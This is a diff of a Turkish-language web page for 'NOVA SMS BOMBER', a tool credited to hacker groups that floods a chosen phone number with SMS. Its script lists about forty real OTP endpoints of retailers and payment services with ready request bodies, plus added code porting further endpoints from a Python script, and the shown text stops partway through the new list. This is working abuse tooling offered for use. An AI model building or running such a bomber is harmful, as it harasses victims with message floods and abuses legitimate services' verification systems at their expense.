@@ -4,487 +4,83 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes">
-    <title>NOVA SMS BOMBER | FRANSA#FRS x SVİLİA HACK | 45+ API</title>
+    <title>NOVA SMS BOMBER | PYTHON API ENTEGRE | 45+ HEDEF</title>
     <link href="https://fonts.googleapis.com/css2?family=Space+Grotesk:wght@300;400;500;600;700&family=Major+Mono+Display&display=swap" rel="stylesheet">
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
     <style>
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-            user-select: none;
-        }
-
-        body {
-            background: #05050A;
-            font-family: 'Space Grotesk', 'Major Mono Display', monospace;
-            color: #e0e0ff;
-            min-height: 100vh;
-            overflow-x: hidden;
-        }
-
-        /* Animasyonlu arka plan */
-        .cyber-bg {
-            position: fixed;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            z-index: -2;
-            background: radial-gradient(circle at 20% 30%, #0a0a2a, #000000);
-        }
-
-        .glow-line {
-            position: fixed;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            z-index: -1;
-            background-image: 
-                repeating-linear-gradient(0deg, rgba(0, 255, 255, 0.03) 0px, rgba(0, 255, 255, 0.03) 1px, transparent 1px, transparent 60px),
-                repeating-linear-gradient(90deg, rgba(255, 0, 255, 0.03) 0px, rgba(255, 0, 255, 0.03) 1px, transparent 1px, transparent 60px);
-        }
-
-        .scan-line {
-            position: fixed;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            background: linear-gradient(to bottom, transparent 0%, rgba(0, 255, 255, 0.05) 50%, transparent 100%);
-            animation: scan 8s linear infinite;
-            pointer-events: none;
-            z-index: 0;
-        }
-
-        @keyframes scan {
-            0% { transform: translateY(-100%); }
-            100% { transform: translateY(100%); }
-        }
-
-        .container {
-            max-width: 1400px;
-            margin: 0 auto;
-            padding: 20px;
-            position: relative;
-            z-index: 2;
-        }
-
-        /* Header yenilendi */
-        .header {
-            text-align: center;
-            padding: 30px 0 25px;
-            border-bottom: 2px solid rgba(0, 255, 255, 0.4);
-            margin-bottom: 30px;
-            position: relative;
-        }
-
-        .header h1 {
-            font-family: 'Major Mono Display', monospace;
-            font-size: 2rem;
-            background: linear-gradient(135deg, #00ffff, #ff00ff, #ff6600);
-            -webkit-background-clip: text;
-            background-clip: text;
-            color: transparent;
-            letter-spacing: 4px;
-            text-shadow: 0 0 20px rgba(0, 255, 255, 0.3);
-        }
-
-        .glitch-text {
-            font-size: 0.8rem;
-            color: #00ffff;
-            opacity: 0.7;
-            letter-spacing: 2px;
-        }
-
-        .logo-container {
-            display: flex;
-            justify-content: center;
-            gap: 50px;
-            margin: 20px 0;
-        }
-
-        .logo-item {
-            text-align: center;
-            text-decoration: none;
-            transition: 0.3s;
-        }
-
-        .logo-item:hover {
-            transform: translateY(-5px);
-            filter: drop-shadow(0 0 15px #00ffff);
-        }
-
-        .logo-img {
-            width: 75px;
-            height: 75px;
-            border-radius: 50%;
-            object-fit: cover;
-            border: 2px solid #00ffff;
-            box-shadow: 0 0 15px rgba(0, 255, 255, 0.3);
-            background: #0a0a1a;
-        }
-
-        .logo-item h3 {
-            font-size: 0.8rem;
-            margin-top: 8px;
-            color: #ff00ff;
-        }
-
-        /* Navigasyon butonları */
-        .nav-buttons {
-            display: flex;
-            justify-content: center;
-            gap: 20px;
-            margin: 20px 0;
-        }
-
-        .nav-btn {
-            padding: 10px 28px;
-            border-radius: 30px;
-            font-weight: bold;
-            text-decoration: none;
-            font-family: 'Space Grotesk', monospace;
-            font-size: 0.8rem;
-            transition: 0.3s;
-            border: 1px solid;
-            backdrop-filter: blur(5px);
-        }
-
-        .nav-btn-ip {
-            background: rgba(0, 0, 0, 0.6);
-            border-color: #00ffff;
-            color: #00ffff;
-        }
-
-        .nav-btn-ip:hover {
-            background: #00ffff;
-            color: #000;
-            box-shadow: 0 0 20px #00ffff;
-        }
-
-        .nav-btn-sms {
-            background: linear-gradient(135deg, #ff00ff, #ff6600);
-            border: none;
-            color: white;
-            box-shadow: 0 0 15px rgba(255, 0, 255, 0.5);
-        }
-
-        /* Ana içerik grid */
-        .content-grid {
-            display: grid;
-            grid-template-columns: 1.6fr 1fr;
-            gap: 25px;
-        }
-
-        /* SMS Kartı - Neon cam efekti */
-        .sms-card {
-            background: rgba(5, 5, 15, 0.7);
-            backdrop-filter: blur(12px);
-            border-radius: 24px;
-            padding: 25px;
-            border: 1px solid rgba(0, 255, 255, 0.3);
-            box-shadow: 0 0 30px rgba(0, 255, 255, 0.1);
-            transition: 0.3s;
-        }
-
-        .sms-title {
-            font-family: 'Major Mono Display', monospace;
-            font-size: 1.2rem;
-            text-align: center;
-            margin-bottom: 25px;
-            color: #ff00ff;
-            text-shadow: 0 0 8px #ff00ff;
-            letter-spacing: 2px;
-        }
-
-        .input-group {
-            display: flex;
-            justify-content: center;
-            margin: 20px 0;
-        }
-
-        .phone-input {
-            background: rgba(0, 0, 0, 0.8);
-            border: 2px solid #00ffff;
-            border-radius: 50px;
-            padding: 14px 25px;
-            width: 280px;
-            color: #00ffff;
-            font-size: 1rem;
-            font-family: monospace;
-            text-align: center;
-            outline: none;
-            transition: 0.3s;
-        }
-
-        .phone-input:focus {
-            border-color: #ff00ff;
-            box-shadow: 0 0 15px #ff00ff;
-        }
-
-        /* Mod seçici */
-        .mode-selector {
-            display: flex;
-            justify-content: center;
-            gap: 15px;
-            margin: 25px 0;
-        }
-
-        .mode-btn {
-            padding: 8px 22px;
-            border-radius: 30px;
-            font-weight: bold;
-            cursor: pointer;
-            font-family: 'Space Grotesk', monospace;
-            background: rgba(0, 0, 0, 0.5);
-            border: 1px solid #00ffff;
-            color: #00ffff;
-            transition: 0.3s;
-        }
-
-        .mode-btn.active {
-            background: linear-gradient(135deg, #00ffff, #ff00ff);
-            color: #000;
-            border: none;
-            box-shadow: 0 0 20px #ff00ff;
-        }
-
-        .mode-btn:hover {
-            transform: scale(1.05);
-        }
-
-        /* Kontrol butonları */
-        .control-buttons {
-            display: flex;
-            justify-content: center;
-            gap: 15px;
-            margin: 25px 0;
-        }
-
-        .btn {
-            padding: 12px 28px;
-            border-radius: 40px;
-            font-weight: bold;
-            cursor: pointer;
-            font-family: 'Space Grotesk', monospace;
-            border: none;
-            display: inline-flex;
-            align-items: center;
-            gap: 8px;
-            font-size: 0.85rem;
-            transition: 0.3s;
-        }
-
-        .btn-start {
-            background: linear-gradient(135deg, #00ff88, #00cc66);
-            color: #000;
-            box-shadow: 0 0 15px #00ff88;
-        }
-
-        .btn-stop {
-            background: linear-gradient(135deg, #ff3366, #cc0033);
-            color: white;
-        }
-
-        .btn-clear {
-            background: rgba(255, 255, 255, 0.1);
-            border: 1px solid #ff00ff;
-            color: #ff00ff;
-        }
-
-        .btn:hover {
-            transform: translateY(-2px);
-            filter: brightness(1.1);
-        }
-
-        /* İstatistikler */
-        .stats {
-            text-align: center;
-            margin: 20px 0;
-            padding: 20px;
-            background: rgba(0, 0, 0, 0.5);
-            border-radius: 20px;
-            border: 1px solid rgba(0, 255, 255, 0.3);
-        }
-
-        .stat-number {
-            font-size: 2.5rem;
-            font-family: 'Major Mono Display', monospace;
-            color: #00ffff;
-            text-shadow: 0 0 10px #00ffff;
-        }
-
-        .success-rate {
-            font-size: 0.85rem;
-            margin-top: 8px;
-            color: #00ff88;
-        }
-
-        #attackStatus {
-            margin-top: 10px;
-            font-size: 0.75rem;
-            color: #ff00ff;
-        }
-
-        /* Log alanı */
-        .log-area {
-            background: rgba(0, 0, 0, 0.7);
-            border-radius: 16px;
-            padding: 15px;
-            height: 280px;
-            overflow-y: auto;
-            font-family: monospace;
-            font-size: 0.7rem;
-            margin-top: 20px;
-            border: 1px solid rgba(0, 255, 255, 0.2);
-        }
-
-        .log-entry {
-            padding: 5px 10px;
-            margin: 4px 0;
-            border-left: 3px solid;
-            animation: fadeIn 0.2s ease;
-        }
-
-        .log-success {
-            border-left-color: #00ff88;
-            color: #a0ffc0;
-        }
-
-        .log-error {
-            border-left-color: #ff3366;
-            color: #ff8888;
-        }
-
-        .log-info {
-            border-left-color: #00ffff;
-            color: #88ffff;
-        }
-
-        @keyframes fadeIn {
-            from {
-                opacity: 0;
-                transform: translateX(-8px);
-            }
-            to {
-                opacity: 1;
-                transform: translateX(0);
-            }
-        }
-
-        /* Müzik player - yeni tema */
-        .music-card {
-            background: rgba(5, 5, 15, 0.7);
-            backdrop-filter: blur(12px);
-            border-radius: 24px;
-            padding: 20px;
-            border: 1px solid rgba(255, 0, 255, 0.3);
-            text-align: center;
-            height: fit-content;
-        }
-
-        .music-title {
-            font-family: 'Major Mono Display', monospace;
-            font-size: 0.9rem;
-            margin-bottom: 15px;
-            color: #ff6600;
-        }
-
-        .music-frame {
-            width: 100%;
-            border-radius: 16px;
-            overflow: hidden;
-            border: 2px solid #ff00ff;
-        }
-
-        .music-frame iframe {
-            width: 100%;
-            height: 170px;
-            border: none;
-        }
-
-        /* Footer */
-        .footer {
-            text-align: center;
-            margin-top: 40px;
-            padding: 20px;
-            border-top: 1px solid rgba(0, 255, 255, 0.2);
-            font-size: 0.7rem;
-        }
-
-        .toast {
-            position: fixed;
-            bottom: 25px;
-            right: 25px;
-            background: linear-gradient(135deg, #ff00ff, #00ffff);
-            color: #000;
-            padding: 12px 24px;
-            border-radius: 40px;
-            z-index: 1000;
-            animation: slideIn 0.3s ease;
-            font-weight: bold;
-            font-size: 0.8rem;
-        }
-
-        @keyframes slideIn {
-            from {
-                transform: translateX(200px);
-                opacity: 0;
-            }
-            to {
-                transform: translateX(0);
-                opacity: 1;
-            }
-        }
-
-        @media (max-width: 800px) {
-            .content-grid {
-                grid-template-columns: 1fr;
-            }
-            .stat-number {
-                font-size: 1.8rem;
-            }
-        }
+        * { margin: 0; padding: 0; box-sizing: border-box; user-select: none; }
+        body { background: #05050A; font-family: 'Space Grotesk', 'Major Mono Display', monospace; color: #e0e0ff; overflow-x: hidden; }
+        .cyber-bg { position: fixed; top: 0; left: 0; width: 100%; height: 100%; z-index: -2; background: radial-gradient(circle at 20% 30%, #0a0a2a, #000000); }
+        .glow-line { position: fixed; top: 0; left: 0; width: 100%; height: 100%; z-index: -1; background-image: repeating-linear-gradient(0deg, rgba(0,255,255,0.03) 0px, rgba(0,255,255,0.03) 1px, transparent 1px, transparent 60px), repeating-linear-gradient(90deg, rgba(255,0,255,0.03) 0px, rgba(255,0,255,0.03) 1px, transparent 1px, transparent 60px); }
+        .scan-line { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: linear-gradient(to bottom, transparent 0%, rgba(0,255,255,0.05) 50%, transparent 100%); animation: scan 8s linear infinite; pointer-events: none; z-index: 0; }
+        @keyframes scan { 0% { transform: translateY(-100%); } 100% { transform: translateY(100%); } }
+        .container { max-width: 1400px; margin: 0 auto; padding: 20px; position: relative; z-index: 2; }
+        .header { text-align: center; padding: 30px 0 25px; border-bottom: 2px solid rgba(0,255,255,0.4); margin-bottom: 30px; }
+        .header h1 { font-family: 'Major Mono Display', monospace; font-size: 2rem; background: linear-gradient(135deg, #00ffff, #ff00ff, #ff6600); -webkit-background-clip: text; background-clip: text; color: transparent; letter-spacing: 4px; text-shadow: 0 0 20px rgba(0,255,255,0.3); }
+        .glitch-text { font-size: 0.8rem; color: #00ffff; opacity: 0.7; letter-spacing: 2px; }
+        .logo-container { display: flex; justify-content: center; gap: 50px; margin: 20px 0; }
+        .logo-item { text-align: center; text-decoration: none; transition: 0.3s; }
+        .logo-item:hover { transform: translateY(-5px); filter: drop-shadow(0 0 15px #00ffff); }
+        .logo-img { width: 75px; height: 75px; border-radius: 50%; object-fit: cover; border: 2px solid #00ffff; box-shadow: 0 0 15px rgba(0,255,255,0.3); background: #0a0a1a; }
+        .logo-item h3 { font-size: 0.8rem; margin-top: 8px; color: #ff00ff; }
+        .nav-buttons { display: flex; justify-content: center; gap: 20px; margin: 20px 0; }
+        .nav-btn { padding: 10px 28px; border-radius: 30px; font-weight: bold; text-decoration: none; font-family: 'Space Grotesk', monospace; font-size: 0.8rem; transition: 0.3s; border: 1px solid; backdrop-filter: blur(5px); }
+        .nav-btn-ip { background: rgba(0,0,0,0.6); border-color: #00ffff; color: #00ffff; }
+        .nav-btn-ip:hover { background: #00ffff; color: #000; box-shadow: 0 0 20px #00ffff; }
+        .nav-btn-sms { background: linear-gradient(135deg, #ff00ff, #ff6600); border: none; color: white; box-shadow: 0 0 15px rgba(255,0,255,0.5); }
+        .content-grid { display: grid; grid-template-columns: 1.6fr 1fr; gap: 25px; }
+        .sms-card { background: rgba(5,5,15,0.7); backdrop-filter: blur(12px); border-radius: 24px; padding: 25px; border: 1px solid rgba(0,255,255,0.3); box-shadow: 0 0 30px rgba(0,255,255,0.1); }
+        .sms-title { font-family: 'Major Mono Display', monospace; font-size: 1.2rem; text-align: center; margin-bottom: 25px; color: #ff00ff; text-shadow: 0 0 8px #ff00ff; letter-spacing: 2px; }
+        .input-group { display: flex; justify-content: center; margin: 20px 0; }
+        .phone-input { background: rgba(0,0,0,0.8); border: 2px solid #00ffff; border-radius: 50px; padding: 14px 25px; width: 280px; color: #00ffff; font-size: 1rem; font-family: monospace; text-align: center; outline: none; transition: 0.3s; }
+        .phone-input:focus { border-color: #ff00ff; box-shadow: 0 0 15px #ff00ff; }
+        .mode-selector { display: flex; justify-content: center; gap: 15px; margin: 25px 0; }
+        .mode-btn { padding: 8px 22px; border-radius: 30px; font-weight: bold; cursor: pointer; font-family: 'Space Grotesk', monospace; background: rgba(0,0,0,0.5); border: 1px solid #00ffff; color: #00ffff; transition: 0.3s; }
+        .mode-btn.active { background: linear-gradient(135deg, #00ffff, #ff00ff); color: #000; border: none; box-shadow: 0 0 20px #ff00ff; }
+        .control-buttons { display: flex; justify-content: center; gap: 15px; margin: 25px 0; }
+        .btn { padding: 12px 28px; border-radius: 40px; font-weight: bold; cursor: pointer; font-family: 'Space Grotesk', monospace; border: none; display: inline-flex; align-items: center; gap: 8px; font-size: 0.85rem; transition: 0.3s; }
+        .btn-start { background: linear-gradient(135deg, #00ff88, #00cc66); color: #000; box-shadow: 0 0 15px #00ff88; }
+        .btn-stop { background: linear-gradient(135deg, #ff3366, #cc0033); color: white; }
+        .btn-clear { background: rgba(255,255,255,0.1); border: 1px solid #ff00ff; color: #ff00ff; }
+        .stats { text-align: center; margin: 20px 0; padding: 20px; background: rgba(0,0,0,0.5); border-radius: 20px; border: 1px solid rgba(0,255,255,0.3); }
+        .stat-number { font-size: 2.5rem; font-family: 'Major Mono Display', monospace; color: #00ffff; text-shadow: 0 0 10px #00ffff; }
+        .success-rate { font-size: 0.85rem; margin-top: 8px; color: #00ff88; }
+        #attackStatus { margin-top: 10px; font-size: 0.75rem; color: #ff00ff; }
+        .log-area { background: rgba(0,0,0,0.7); border-radius: 16px; padding: 15px; height: 280px; overflow-y: auto; font-family: monospace; font-size: 0.7rem; margin-top: 20px; border: 1px solid rgba(0,255,255,0.2); }
+        .log-entry { padding: 5px 10px; margin: 4px 0; border-left: 3px solid; animation: fadeIn 0.2s ease; }
+        .log-success { border-left-color: #00ff88; color: #a0ffc0; }
+        .log-error { border-left-color: #ff3366; color: #ff8888; }
+        .log-info { border-left-color: #00ffff; color: #88ffff; }
+        @keyframes fadeIn { from { opacity: 0; transform: translateX(-8px); } to { opacity: 1; transform: translateX(0); } }
+        .music-card { background: rgba(5,5,15,0.7); backdrop-filter: blur(12px); border-radius: 24px; padding: 20px; border: 1px solid rgba(255,0,255,0.3); text-align: center; height: fit-content; }
+        .music-title { font-family: 'Major Mono Display', monospace; font-size: 0.9rem; margin-bottom: 15px; color: #ff6600; }
+        .music-frame { width: 100%; border-radius: 16px; overflow: hidden; border: 2px solid #ff00ff; }
+        .music-frame iframe { width: 100%; height: 170px; border: none; }
+        .footer { text-align: center; margin-top: 40px; padding: 20px; border-top: 1px solid rgba(0,255,255,0.2); font-size: 0.7rem; }
+        .toast { position: fixed; bottom: 25px; right: 25px; background: linear-gradient(135deg, #ff00ff, #00ffff); color: #000; padding: 12px 24px; border-radius: 40px; z-index: 1000; animation: slideIn 0.3s ease; font-weight: bold; font-size: 0.8rem; }
+        @keyframes slideIn { from { transform: translateX(200px); opacity: 0; } to { transform: translateX(0); opacity: 1; } }
+        @media (max-width: 800px) { .content-grid { grid-template-columns: 1fr; } .stat-number { font-size: 1.8rem; } }
     </style>
 </head>
 <body>
-<div class="cyber-bg"></div>
-<div class="glow-line"></div>
-<div class="scan-line"></div>
-
+<div class="cyber-bg"></div><div class="glow-line"></div><div class="scan-line"></div>
 <div class="container">
     <div class="header">
         <h1>NOVA SMS BOMBER</h1>
-        <div class="glitch-text">// FRANSA#FRS x SVİLİA HACK // 45+ API AKTİF //</div>
+        <div class="glitch-text">// PYTHON API ENTEGRE | FRANSA#FRS x SVİLİA HACK // 45+ HEDEF //</div>
         <div class="logo-container">
-            <a href="https://t.me/fransafrs2" target="_blank" class="logo-item">
-                <img src="fransa_logo.jpg" class="logo-img" alt="FRANSA#FRS" onerror="this.src='https://placehold.co/75x75/ff00ff/white?text=FRS'">
-                <h3>FRANSA#FRS</h3>
-            </a>
-            <a href="https://t.me/sviliahack" target="_blank" class="logo-item">
-                <img src="svilia_logo.jpg" class="logo-img" alt="SVİLİA HACK" onerror="this.src='https://placehold.co/75x75/00ffff/white?text=SVL'">
-                <h3>SVİLİA HACK</h3>
-            </a>
+            <a href="https://t.me/fransafrs2" target="_blank" class="logo-item"><img src="fransa_logo.jpg" class="logo-img" onerror="this.src='https://placehold.co/75x75/ff00ff/white?text=FRS'"><h3>FRANSA#FRS</h3></a>
+            <a href="https://t.me/sviliahack" target="_blank" class="logo-item"><img src="svilia_logo.jpg" class="logo-img" onerror="this.src='https://placehold.co/75x75/00ffff/white?text=SVL'"><h3>SVİLİA HACK</h3></a>
         </div>
     </div>
-
     <div class="nav-buttons">
-        <a href="https://kadrbequit.github.io/-p-sorgu-sitesi-/" target="_blank" class="nav-btn nav-btn-ip">
-            <i class="fas fa-globe"></i> IP OSINT
-        </a>
-        <div class="nav-btn nav-btn-sms">
-            <i class="fas fa-skull"></i> SMS BOMBER ULTRA
-        </div>
+        <a href="https://kadrbequit.github.io/-p-sorgu-sitesi-/" target="_blank" class="nav-btn nav-btn-ip"><i class="fas fa-globe"></i> IP OSINT</a>
+        <div class="nav-btn nav-btn-sms"><i class="fas fa-skull"></i> SMS BOMBER ULTRA</div>
     </div>
-
     <div class="content-grid">
         <div class="sms-card">
             <div class="sms-title"><i class="fas fa-bolt"></i> BOMBARDIMAN KONTROL PANELİ <i class="fas fa-bolt"></i></div>
-            <div class="input-group">
-                <input type="tel" id="phoneNumber" class="phone-input" placeholder="5XX XXX XX XX" maxlength="10">
-            </div>
+            <div class="input-group"><input type="tel" id="phoneNumber" class="phone-input" placeholder="5XX XXX XX XX" maxlength="10"></div>
             <div class="mode-selector">
                 <button class="mode-btn active" data-mode="normal"><i class="fas fa-clock"></i> NORMAL</button>
                 <button class="mode-btn" data-mode="ultra"><i class="fas fa-rocket"></i> ULTRA</button>
@@ -502,218 +98,137 @@
                 <div id="attackStatus">⚡ SİSTEM HAZIR ⚡</div>
             </div>
             <div class="log-area" id="logArea">
-                <div class="log-entry log-info"><i class="fas fa-terminal"></i> NOVA BOMBER SİSTEMİ AKTİF</div>
-                <div class="log-entry log-info"><i class="fas fa-database"></i> 45+ API entegre edildi - Proxy yok</div>
-                <div class="log-entry log-info"><i class="fas fa-bolt"></i> Yeni nesil altyapı hazır</div>
+                <div class="log-entry log-info"><i class="fas fa-terminal"></i> NOVA BOMBER | PYTHON API ENTEGRE</div>
+                <div class="log-entry log-info"><i class="fas fa-database"></i> 45+ API aktif (filemarket, bim, dominos, kofteci...)</div>
+                <div class="log-entry log-info"><i class="fas fa-bolt"></i> Proxy yok - Doğrudan istek - Yüksek hız</div>
             </div>
         </div>
-
         <div class="music-card">
             <div class="music-title"><i class="fas fa-headphones"></i> MOTİVASYON FREKANSI <i class="fas fa-music"></i></div>
-            <div class="music-frame">
-                <iframe src="https://www.youtube.com/embed/NMBmbQjXz6E?autoplay=0&loop=1&playlist=NMBmbQjXz6E" 
-                        title="YouTube music" frameborder="0" 
-                        allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture" 
-                        allowfullscreen></iframe>
-            </div>
-            <div style="margin-top: 12px; font-size: 0.65rem; opacity: 0.8;">
-                <i class="fas fa-shield-alt"></i> 45+ API | ANLIK PATLAMA
-            </div>
+            <div class="music-frame"><iframe src="https://www.youtube.com/embed/NMBmbQjXz6E?autoplay=0&loop=1&playlist=NMBmbQjXz6E" title="YouTube music" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture" allowfullscreen></iframe></div>
+            <div style="margin-top:12px;font-size:0.65rem;opacity:0.8;"><i class="fas fa-shield-alt"></i> 45+ API | ANLIK PATLAMA | PYTHON TARZI</div>
         </div>
     </div>
-    
-    <div class="footer">
-        <i class="fas fa-code"></i> Geliştirici: <strong style="color:#00ffff">KADRBEQUİT</strong> | 
-        <strong style="color:#ff00ff">DEHA INC.</strong> | <strong style="color:#ff6600">RXCKSTAR</strong><br>
-        <small>🔮 45+ API | Doğrudan İstek | Ultra Hızlı Bombardıman | Neo Cyber Tema</small>
-    </div>
+    <div class="footer"><i class="fas fa-code"></i> Geliştirici: <strong style="color:#00ffff">KADRBEQUİT</strong> | <strong style="color:#ff00ff">DEHA INC.</strong> | <strong style="color:#ff6600">RXCKSTAR</strong><br><small>🔮 Python API'ler JS'e aktarıldı | Proxy yok | Ultra Hız | Neo Cyber Tema</small></div>
 </div>
-
 <script>
-// ==================== 45+ SÜPER SMS API LİSTESİ ====================
-const smsAPIs = [
-    { name: "Trendyol", url: "https://api.trendyol.com/public/otp/send", method: "POST", headers: {"Content-Type": "application/json"}, body: (p) => JSON.stringify({ phone: p }) },
-    { name: "Trendyol 2", url: "https://api.trendyol.com/public/otp", method: "POST", headers: {"Content-Type": "application/json"}, body: (p) => JSON.stringify({ mobilePhone: p, type: "SMS" }) },
-    { name: "Getir", url: "https://api.getir.com/v1/auth/otp", method: "POST", headers: {"Content-Type": "application/json"}, body: (p) => JSON.stringify({ phoneNumber: p }) },
-    { name: "Getir 2", url: "https://api.getir.com/v3/auth/otp/send", method: "POST", headers: {"Content-Type": "application/json"}, body: (p) => JSON.stringify({ phone: p }) },
-    { name: "Yemeksepeti", url: "https://www.yemeksepeti.com/api/otp/send", method: "POST", headers: {"Content-Type": "application/json"}, body: (p) => JSON.stringify({ mobilePhone: p }) },
-    { name: "Yemeksepeti 2", url: "https://api.yemeksepeti.com/api/otp", method: "POST", headers: {"Content-Type": "application/json"}, body: (p) => JSON.stringify({ phone: p }) },
-    { name: "Migros", url: "https://migros.com.tr/rest/users/login/otp", method: "POST", headers: {"Content-Type": "application/json"}, body: (p) => JSON.stringify({ phone: p }) },
-    { name: "Hepsiburada", url: "https://api.hepsiburada.com/auth/otp", method: "POST", headers: {"Content-Type": "application/json"}, body: (p) => JSON.stringify({ phone: p }) },
-    { name: "Pazarama", url: "https://api.pazarama.com/auth/send-otp", method: "POST", headers: {"Content-Type": "application/json"}, body: (p) => JSON.stringify({ phone: p }) },
-    { name: "TıklaGelsin", url: "https://api.tiklagelsin.com/api/customer/otp", method: "POST", headers: {"Content-Type": "application/json"}, body: (p) => JSON.stringify({ phone: p }) },
-    { name: "Bimcell", url: "https://api.bimcell.com.tr/otp/send", method: "POST", headers: {"Content-Type": "application/json"}, body: (p) => JSON.stringify({ msisdn: p }) },
-    { name: "Sahibinden", url: "https://api.sahibinden.com/member/otp", method: "POST", headers: {"Content-Type": "application/json"}, body: (p) => JSON.stringify({ phone: p }) },
-    { name: "İdefix", url: "https://www.idefix.com/api/otp", method: "POST", headers: {"Content-Type": "application/json"}, body: (p) => JSON.stringify({ phoneNumber: p }) },
-    { name: "n11", url: "https://www.n11.com/api/otp/send", method: "POST", headers: {"Content-Type": "application/json"}, body: (p) => JSON.stringify({ phone: p }) },
-    { name: "Flo", url: "https://api.flo.com.tr/api/otp", method: "POST", headers: {"Content-Type": "application/json"}, body: (p) => JSON.stringify({ phone: p }) },
-    { name: "LC Waikiki", url: "https://www.lcwaikiki.com/tr-TR/TR/uye/otp-gonder", method: "POST", headers: {"Content-Type": "application/json"}, body: (p) => JSON.stringify({ telefon: p }) },
-    { name: "Boyner", url: "https://api.boyner.com.tr/api/customer/otp", method: "POST", headers: {"Content-Type": "application/json"}, body: (p) => JSON.stringify({ phone: p }) },
-    { name: "Papara", url: "https://api.papara.com/api/otp", method: "POST", headers: {"Content-Type": "application/json"}, body: (p) => JSON.stringify({ phoneNumber: p }) },
-    { name: "Iyzico", url: "https://api.iyzico.com/otp/send", method: "POST", headers: {"Content-Type": "application/json"}, body: (p) => JSON.stringify({ phone: p }) },
-    { name: "Sok Market", url: "https://api.sokmarket.com.tr/otp/send", method: "POST", headers: {"Content-Type": "application/json"}, body: (p) => JSON.stringify({ phone: p }) },
-    { name: "A101", url: "https://api.a101.com.tr/api/otp", method: "POST", headers: {"Content-Type": "application/json"}, body: (p) => JSON.stringify({ mobile: p }) },
-    { name: "CarrefourSA", url: "https://api.carrefoursa.com/api/otp/send", method: "POST", headers: {"Content-Type": "application/json"}, body: (p) => JSON.stringify({ phone: p }) },
-    { name: "Netflix", url: "https://api.netflix.com/api/otp", method: "POST", headers: {"Content-Type": "application/json"}, body: (p) => JSON.stringify({ phone: p }) },
-    { name: "Banabi", url: "https://api.banabi.com/v1/auth/otp", method: "POST", headers: {"Content-Type": "application/json"}, body: (p) => JSON.stringify({ phone: p }) },
-    { name: "ÇiçekSepeti", url: "https://api.ciceksepeti.com/rest/otp/send", method: "POST", headers: {"Content-Type": "application/json"}, body: (p) => JSON.stringify({ mobilePhone: p }) },
-    { name: "Marketyo", url: "https://www.marketyo.com/api/send-otp", method: "POST", headers: {"Content-Type": "application/json"}, body: (p) => JSON.stringify({ phone: p }) },
-    { name: "D&R", url: "https://api.dr.com.tr/v1/auth/otp", method: "POST", headers: {"Content-Type": "application/json"}, body: (p) => JSON.stringify({ phoneNumber: p }) },
-    { name: "MediaMarkt", url: "https://api.mediamarkt.com.tr/otp/send", method: "POST", headers: {"Content-Type": "application/json"}, body: (p) => JSON.stringify({ phone: p }) },
-    { name: "Teknosa", url: "https://api.teknosa.com/auth/otp", method: "POST", headers: {"Content-Type": "application/json"}, body: (p) => JSON.stringify({ mobilePhone: p }) },
-    { name: "Vatan", url: "https://api.vatanbilgisayar.com/api/otp", method: "POST", headers: {"Content-Type": "application/json"}, body: (p) => JSON.stringify({ phone: p }) },
-    { name: "Koçtaş", url: "https://api.koctas.com.tr/otp/send", method: "POST", headers: {"Content-Type": "application/json"}, body: (p) => JSON.stringify({ phoneNumber: p }) },
-    { name: "Bauhaus", url: "https://api.bauhaus.com.tr/otp", method: "POST", headers: {"Content-Type": "application/json"}, body: (p) => JSON.stringify({ phone: p }) },
-    { name: "Decathlon", url: "https://api.decathlon.com.tr/otp/send", method: "POST", headers: {"Content-Type": "application/json"}, body: (p) => JSON.stringify({ phone: p }) },
-    { name: "Adidas", url: "https://api.adidas.com.tr/auth/otp", method: "POST", headers: {"Content-Type": "application/json"}, body: (p) => JSON.stringify({ phoneNumber: p }) },
-    { name: "Nike", url: "https://api.nike.com.tr/otp", method: "POST", headers: {"Content-Type": "application/json"}, body: (p) => JSON.stringify({ phone: p }) },
-    { name: "Pull&Bear", url: "https://api.pullandbear.com/otp", method: "POST", headers: {"Content-Type": "application/json"}, body: (p) => JSON.stringify({ phone: p }) },
-    { name: "Zara", url: "https://api.zara.com/tr/otp/send", method: "POST", headers: {"Content-Type": "application/json"}, body: (p) => JSON.stringify({ mobile: p }) },
-    { name: "Mudo", url: "https://api.mudo.com.tr/auth/otp", method: "POST", headers: {"Content-Type": "application/json"}, body: (p) => JSON.stringify({ phone: p }) },
-    { name: "EnglishHome", url: "https://www.englishhome.com/api/member/sendOtp", method: "POST", headers: {"Content-Type": "application/json"}, body: (p) => JSON.stringify({ Phone: p }) },
-    { name: "Koton", url: "https://www.koton.com/api/otp/send", method: "POST", headers: {"Content-Type": "application/json"}, body: (p) => JSON.stringify({ phoneNumber: p }) },
-    { name: "Mavi", url: "https://api.mavi.com/tr/otp", method: "POST", headers: {"Content-Type": "application/json"}, body: (p) => JSON.stringify({ phone: p }) },
-    { name: "Defacto", url: "https://api.defacto.com.tr/otp", method: "POST", headers: {"Content-Type": "application/json"}, body: (p) => JSON.stringify({ mobilePhone: p }) }
+// ============ PYTHON BETİĞİNDEKİ TÜM API'LER JAVASCRIPT'E AKTARILDI ============
+// Mail üretici (dominos, evidea, yapp için)
+function randomMail() { return Math.random().toString(36).substring(2,10)+"@hotmail.com"; }
+function uuidv4() { return "xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx".replace(/[xy]/g, function(c) { var r = Math.random() * 16 | 0, v = c == "x" ? r : (r & 0x3 | 0x8); return v.toString(16); }); }
+
+// API listesi (Python betiğindeki tüm fonksiyonlar birebir uyarlandı)
+const APIS = [
+    { name: "FileMarket", func: async (phone) => { try { let r=await fetch("https://api.filemarket.com.tr/v1/otp/send",{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({mobilePhoneNumber:`90${phone}`})}); let d=await r.json(); return r.ok && d?.data==="200 OK"; } catch(e){return false;} } },
